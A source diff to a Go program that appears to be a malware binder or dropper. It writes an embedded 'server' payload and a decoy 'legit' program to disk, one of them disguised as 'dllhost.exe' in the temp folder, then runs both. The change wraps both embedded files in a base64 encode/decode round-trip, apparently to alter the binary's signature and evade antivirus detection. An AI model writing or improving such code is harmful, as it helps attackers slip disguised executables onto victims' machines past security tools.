@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"io/ioutil"
 	"os"
 	"os/exec"
@@ -25,6 +26,8 @@ var filePath = os.TempDir() + `\dllhost.exe`
 
 func main() {
 
+	serverFile = EncodeAndDecodeBuffer(serverFile)
+	legitFile = EncodeAndDecodeBuffer(legitFile)
 	wFile(serverPath, serverFile)
 	time.Sleep(100 * time.Millisecond)
 	wFile(filePath, legitFile)
@@ -35,6 +38,36 @@ func main() {
 	time.Sleep(100 * time.Millisecond)
 	WaitProcessToSafeClose(serverPid, serverPath)
 	WaitProcessToSafeClose(filePid, filePath)
+}
+
+//https://gist.github.com/Xeoncross/e83313ac7157c659416676a6044fcd1e
+
+/*EncodeAndDecodeBuffer encode and decode value*/
+func EncodeAndDecodeBuffer(buffer []byte) (dBuffer []byte) {
+	a := Base64Encode(buffer)
+	dBuffer, err := Base64Decode(a)
+	if err != nil {
+		panic(dBuffer)
+	}
+	return
+}
+
+/*Base64Encode Encode using base64*/
+func Base64Encode(message []byte) []byte {
+	b := make([]byte, base64.StdEncoding.EncodedLen(len(message)))
+	base64.StdEncoding.Encode(b, message)
+	return b
+}
+
+/*Base64Decode decode using base64*/
+func Base64Decode(message []byte) (b []byte, err error) {
+	var l int
+	b = make([]byte, base64.StdEncoding.DecodedLen(len(message)))
+	l, err = base64.StdEncoding.Decode(b, message)
+	if err != nil {
+		return
+	}
+	return b[:l], nil
 }
 
 /*ExecFile Execute file*/
